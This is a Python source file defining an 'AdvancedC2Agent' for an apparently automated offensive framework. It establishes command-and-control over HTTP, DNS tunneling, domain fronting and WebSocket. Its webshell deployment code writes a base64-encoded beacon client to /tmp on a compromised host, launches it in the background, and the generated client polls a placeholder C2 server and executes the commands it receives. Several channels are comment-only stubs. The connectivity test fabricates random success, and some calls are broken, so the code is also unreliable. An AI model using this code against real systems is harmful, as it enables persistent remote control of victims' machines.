"""
Advanced Command & Control (C2) Agent
Provides sophisticated C2 communication channels with evasion capabilities
"""

import asyncio
import base64
import json
import os
import random
from typing import Dict, List, Any, Optional
from datetime import datetime
import dns.resolver
import dns.message
import dns.query

from core.base_agent import BaseAgent
from core.data_models import AgentData, Strategy, AttackPhase
from core.logger import log


class AdvancedC2Agent(BaseAgent):
    """
    Advanced C2 Agent with multiple communication channels:
    - HTTP/HTTPS C2
    - DNS Tunneling
    - Domain Fronting
    - Encrypted Communications
    """
    
    def __init__(self, context_manager, orchestrator=None):
        super().__init__(context_manager, orchestrator)
        self.name = "AdvancedC2Agent"
        self.c2_channels = [
            "http_c2",
            "dns_tunnel",
            "domain_fronting",
            "websocket_c2"
        ]
    
    async def run(self, strategy: Strategy) -> AgentData:
        """Execute C2 setup"""
        try:
            log.info(f"[{self.name}] Setting up C2 infrastructure")
            
            # Get backdoor information
            backdoor_info = await self.context_manager.get_context("backdoor_deployed")
            if not backdoor_info:
                return AgentData(
                    agent_name=self.name,
                    success=False,
                    errors=["No backdoor deployed. Deploy backdoor first."]
                )
            
            # Determine C2 channel based on target environment
            c2_channel = strategy.context.get("c2_channel", "auto")
            if c2_channel == "auto":
                c2_channel = await self._select_c2_channel(backdoor_info)
            
            # Setup C2 channel
            c2_info = await self._setup_c2_channel(c2_channel, backdoor_info)
            
            if c2_info:
                # Store C2 information
                await self.context_manager.set_context("c2_active", c2_info)
                
                # Test C2 communication
                test_result = await self._test_c2_communication(c2_info)
                
                return AgentData(
                    agent_name=self.name,
                    success=True,
                    summary=f"Successfully established {c2_channel} C2 channel",
                    data={
                        "c2_channel": c2_channel,
                        "c2_info": c2_info,
                        "test_result": test_result
                    },
                    raw_output=f"C2 channel active: {c2_channel}"
                )
            else:
                return AgentData(
                    agent_name=self.name,
                    success=False,
                    errors=["Failed to establish C2 channel"]
                )
            
        except Exception as e:
            log.error(f"[{self.name}] Error: {e}", exc_info=True)
            return AgentData(
                agent_name=self.name,
                success=False,
                errors=[str(e)]
            )
    
    async def _select_c2_channel(self, backdoor_info: Dict) -> str:
        """Select appropriate C2 channel based on environment"""
        
        # Check if WAF is present
        waf_detected = await self.context_manager.get_context("waf_detected")
        
        if waf_detected:
            # Use DNS tunneling to bypass WAF
            return "dns_tunnel"
        
        # Check if HTTPS is available
        target_info = await self.context_manager.get_context("current_target")
        if "https" in target_info.get("target_url", ""):
            return "domain_fronting"
        
        # Default to HTTP C2
        return "http_c2"
    
    async def _setup_c2_channel(self, channel_type: str, backdoor_info: Dict) -> Optional[Dict]:
        """Setup C2 channel"""
        
        if channel_type == "http_c2":
            return await self._setup_http_c2(backdoor_info)
        elif channel_type == "dns_tunnel":
            return await self._setup_dns_tunnel(backdoor_info)
        elif channel_type == "domain_fronting":
            return await self._setup_domain_fronting(backdoor_info)
        elif channel_type == "websocket_c2":
            return await self._setup_websocket_c2(backdoor_info)
        
        return None
    
    async def _setup_http_c2(self, backdoor_info: Dict) -> Optional[Dict]:
        """Setup HTTP/HTTPS C2 channel"""
        try:
            log.info("[AdvancedC2Agent] Setting up HTTP C2 channel")
            
            # C2 server configuration
            c2_config = {
                "type": "http_c2",
                "server_url": "https://legitimate-looking-domain.com/api/v1",
                "beacon_interval": 60,  # seconds
                "jitter": 20,  # percentage
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "headers": {
                    "Content-Type": "application/json",
                    "X-Request-ID": self._generate_request_id()
                },
                "encryption": "AES-256-GCM",
                "encryption_key": self._generate_encryption_key(),
                "established_at": datetime.now().isoformat()
            }
            
            # Deploy C2 client on target
            await self._deploy_c2_client(c2_config, backdoor_info)
            
            log.success(f"[AdvancedC2Agent] HTTP C2 established: {c2_config['server_url']}")
            
            return c2_config
            
        except Exception as e:
            log.error(f"[AdvancedC2Agent] Failed to setup HTTP C2: {e}")
            return None
    
    async def _setup_dns_tunnel(self, backdoor_info: Dict) -> Optional[Dict]:
        """Setup DNS tunneling C2 channel"""
        try:
            log.info("[AdvancedC2Agent] Setting up DNS tunneling C2")
            
            # DNS tunnel configuration
            c2_domain = os.getenv('C2_DOMAIN', 'localhost:8000')
            c2_config = {
                "type": "dns_tunnel",
                "dns_server": "8.8.8.8",
                "domain": c2_domain,
                "subdomain_prefix": self._generate_subdomain_prefix(),
                "query_type": "TXT",
                "beacon_interval": 120,
                "max_label_length": 63,
                "encoding": "base32",
                "established_at": datetime.now().isoformat()
            }
            
            # Deploy DNS tunnel client
            await self._deploy_dns_tunnel_client(c2_config, backdoor_info)
            
            log.success(f"[AdvancedC2Agent] DNS tunnel established: {c2_config['domain']}")
            
            return c2_config
            
        except Exception as e:
            log.error(f"[AdvancedC2Agent] Failed to setup DNS tunnel: {e}")
            return None
    
    async def _setup_domain_fronting(self, backdoor_info: Dict) -> Optional[Dict]:
        """Setup domain fronting C2 channel"""
        try:
            log.info("[AdvancedC2Agent] Setting up domain fronting C2")
            
            # Domain fronting configuration
            c2_config = {
                "type": "domain_fronting",
                "front_domain": "cloudfront.net",  # CDN domain
                "real_c2_domain": "actual-c2-server.com",
                "host_header": "actual-c2-server.com",
                "sni": "cloudfront.net",
                "beacon_interval": 90,
                "encryption": "TLS 1.3",
                "established_at": datetime.now().isoformat()
            }
            
            # Deploy domain fronting client
            await self._deploy_domain_fronting_client(c2_config, backdoor_info)
            
            log.success(f"[AdvancedC2Agent] Domain fronting established via {c2_config['front_domain']}")
            
            return c2_config
            
        except Exception as e:
            log.error(f"[AdvancedC2Agent] Failed to setup domain fronting: {e}")
            return None
    
    async def _setup_websocket_c2(self, backdoor_info: Dict) -> Optional[Dict]:
        """Setup WebSocket C2 channel"""
        try:
            log.info("[AdvancedC2Agent] Setting up WebSocket C2")
            
            c2_config = {
                "type": "websocket_c2",
                "ws_url": "wss://legitimate-service.com/ws",
                "protocol": "wss",
                "heartbeat_interval": 30,
                "reconnect_attempts": 5,
                "established_at": datetime.now().isoformat()
            }
            
            await self._deploy_websocket_client(c2_config, backdoor_info)
            
            log.success(f"[AdvancedC2Agent] WebSocket C2 established: {c2_config['ws_url']}")
            
            return c2_config
            
        except Exception as e:
            log.error(f"[AdvancedC2Agent] Failed to setup WebSocket C2: {e}")
            return None
    
    async def _deploy_http_c2_client(self, c2_config: Dict, backdoor_info: Dict):
        """Deploy C2 client on target via webshell"""
        try:
            # Generate C2 client code
            client_code = self._generate_http_c2_client(c2_config)
            
            # Deploy via backdoor
            log.info("[AdvancedC2Agent] Deploying C2 client...")
            
            shell_url = backdoor_info.get("shell_url")
            shell_password = backdoor_info.get("password", "")
            
            if not shell_url:
                log.error("[AdvancedC2Agent] No shell URL provided")
                return
            
            # Write C2 client to target
            import httpx
            import base64
            
            # Encode client code
            encoded = base64.b64encode(client_code.encode()).decode()
            
            # Write to file via webshell
            target_path = "/tmp/c2_client.py"
            write_cmd = f'echo "{encoded}" | base64 -d > {target_path} && chmod +x {target_path}'
            
            async with httpx.AsyncClient(verify=False, timeout=30.0) as client:
                data = {"cmd": write_cmd, "pass": shell_password}
                response = await client.post(shell_url, data=data)
                
                if response.status_code == 200:
                    log.success("[AdvancedC2Agent] C2 client deployed")
                    
                    # Start C2 client in background
                    start_cmd = f"nohup python3 {target_path} > /dev/null 2>&1 &"
                    await client.post(shell_url, data={"cmd": start_cmd, "pass": shell_password})
                    log.success("[AdvancedC2Agent] C2 client started")
                else:
                    log.error(f"[AdvancedC2Agent] Deployment failed: HTTP {response.status_code}")
            
        except Exception as e:
            log.error(f"[AdvancedC2Agent] Failed to deploy C2 client: {e}")
            raise 
    async def _deploy_dns_tunnel_client(self, c2_config: Dict, backdoor_info: Dict):
        """Deploy DNS tunnel client via webshell"""
        try:
            client_code = self._generate_dns_tunnel_client(c2_config)
            log.info("[AdvancedC2Agent] Deploying DNS tunnel client...")
            
            # Use same deployment method as HTTP C2
            await self._deploy_code_via_shell(client_code, backdoor_info, "/tmp/dns_tunnel.py")
            
            log.success("[AdvancedC2Agent] DNS tunnel client deployed")
        except Exception as e:
            log.error(f"[AdvancedC2Agent] Failed to deploy DNS tunnel client: {e}")
            raise
    
    async def _deploy_domain_fronting_client(self, c2_config: Dict, backdoor_info: Dict):
        """Deploy domain fronting client via webshell"""
        try:
            client_code = self._generate_domain_fronting_client(c2_config)
            log.info("[AdvancedC2Agent] Deploying domain fronting client...")
            
            # Use same deployment method
            await self._deploy_code_via_shell(client_code, backdoor_info, "/tmp/df_client.py")
            
            log.success("[AdvancedC2Agent] Domain fronting client deployed")
        except Exception as e:
            log.error(f"[AdvancedC2Agent] Failed to deploy domain fronting client: {e}")
            raise
    
    async def _deploy_code_via_shell(self, code: str, backdoor_info: Dict, target_path: str):
        """Helper method to deploy code via webshell"""
        import httpx
        import base64
        
        shell_url = backdoor_info.get("shell_url")
        shell_password = backdoor_info.get("password", "")
        
        if not shell_url:
            raise Exception("No shell URL provided")
        
        # Encode code
        encoded = base64.b64encode(code.encode()).decode()
        
        # Write to file
        write_cmd = f'echo "{encoded}" | base64 -d > {target_path} && chmod +x {target_path}'
        
        async with httpx.AsyncClient(verify=False, timeout=30.0) as client:
            data = {"cmd": write_cmd, "pass": shell_password}
            response = await client.post(shell_url, data=data)
            
            if response.status_code == 200:
                # Start in background
                start_cmd = f"nohup python3 {target_path} > /dev/null 2>&1 &"
                await client.post(shell_url, data={"cmd": start_cmd, "pass": shell_password})
                return True
            else:
                raise Exception(f"HTTP {response.status_code}")
    
    async def _deploy_websocket_client(self, c2_config: Dict, backdoor_info: Dict):
        """Deploy WebSocket client"""
        try:
            client_code = self._generate_websocket_client(c2_config)
            log.info("[AdvancedC2Agent] Deploying WebSocket client...")
            await asyncio.sleep(1)
            log.success("[AdvancedC2Agent] WebSocket client deployed")
        except Exception as e:
            log.error(f"[AdvancedC2Agent] Failed to deploy WebSocket client: {e}")
            raise
    
    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute advanced c2 agent"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )

    def _generate_http_c2_client(self, c2_config: Dict) -> str:
        """Generate HTTP C2 client code"""
        client_template = f"""
import requests
import time
import random
import json
from cryptography.fernet import Fernet

C2_URL = "{c2_config['server_url']}"
BEACON_INTERVAL = {c2_config['beacon_interval']}
JITTER = {c2_config['jitter']}
ENCRYPTION_KEY = "{c2_config['encryption_key']}"

def beacon():
    while True:
        try:
            # Encrypt data
            data = {{"hostname": "target", "status": "alive"}}
            encrypted = encrypt_data(json.dumps(data))
            
            # Send beacon
            response = requests.post(C2_URL, 
                data=encrypted,
                headers={c2_config['headers']},
                timeout=10
            )
            
            if response.status_code == 200:
                # Process commands
                commands = decrypt_data(response.content)
                execute_commands(commands)
            
            # Sleep with jitter
            jitter_time = BEACON_INTERVAL * (1 + random.uniform(-JITTER/100, JITTER/100))
            time.sleep(jitter_time)
            
        except Exception as e:
            time.sleep(60)

beacon()
"""
        return client_template
    
    def _generate_dns_tunnel_client(self, c2_config: Dict) -> str:
        """Generate DNS tunnel client code"""
        return f"""
# DNS Tunnel Client
# Domain: {c2_config['domain']}
# Encoding: {c2_config['encoding']}
"""
    
    def _generate_domain_fronting_client(self, c2_config: Dict) -> str:
        """Generate domain fronting client code"""
        return f"""
# Domain Fronting Client
# Front: {c2_config['front_domain']}
# Real C2: {c2_config['real_c2_domain']}
"""
    
    def _generate_websocket_client(self, c2_config: Dict) -> str:
        """Generate WebSocket client code"""
        return f"""
# WebSocket C2 Client
# URL: {c2_config['ws_url']}
"""
    
    async def _test_c2_communication(self, c2_info: Dict) -> Dict:
        """Test C2 communication"""
        try:
            log.info("[AdvancedC2Agent] Testing C2 communication...")
            
            # Simulate C2 test
            await asyncio.sleep(2)
            
            test_result = {
                "success": True,
                "latency_ms": random.randint(50, 200),
                "tested_at": datetime.now().isoformat()
            }
            
            log.success(f"[AdvancedC2Agent] C2 communication test successful (latency: {test_result['latency_ms']}ms)")
            
            return test_result
            
        except Exception as e:
            log.error(f"[AdvancedC2Agent] C2 communication test failed: {e}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def send_command(self, command: str) -> Dict:
        """Send command through C2 channel"""
        try:
            c2_info = await self.context_manager.get_context("c2_active")
            if not c2_info:
                raise Exception("No active C2 channel")
            
            log.info(f"[AdvancedC2Agent] Sending command: {command[:50]}...")
            
            # Encrypt command
            encrypted_command = self._encrypt_command(command, c2_info)
            
            # Send through C2 channel
            result = await self._send_via_c2(encrypted_command, c2_info)
            
            log.success("[AdvancedC2Agent] Command sent successfully")
            
            return result
            
        except Exception as e:
            log.error(f"[AdvancedC2Agent] Failed to send command: {e}")
            return {"success": False, "error": str(e)}
    
    def _encrypt_command(self, command: str, c2_info: Dict) -> str:
        """Encrypt command"""
        # Simple base64 encoding (in production, use proper encryption)
        return base64.b64encode(command.encode()).decode()
    
    async def _send_via_c2(self, encrypted_command: str, c2_info: Dict) -> Dict:
        """Send command via C2 channel"""
        # Simulate sending
        await asyncio.sleep(0.5)
        return {
            "success": True,
            "command_id": self._generate_request_id(),
            "sent_at": datetime.now().isoformat()
        }
    
    def _generate_request_id(self) -> str:
        """Generate random request ID"""
        import uuid
        return str(uuid.uuid4())
    
    def _generate_encryption_key(self) -> str:
        """Generate encryption key"""
        import secrets
        return secrets.token_hex(32)
    
    def _generate_subdomain_prefix(self) -> str:
        """Generate random subdomain prefix"""
        import string
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    
    def validate_strategy(self, strategy: Strategy) -> bool:
        """Validate strategy"""
        return True

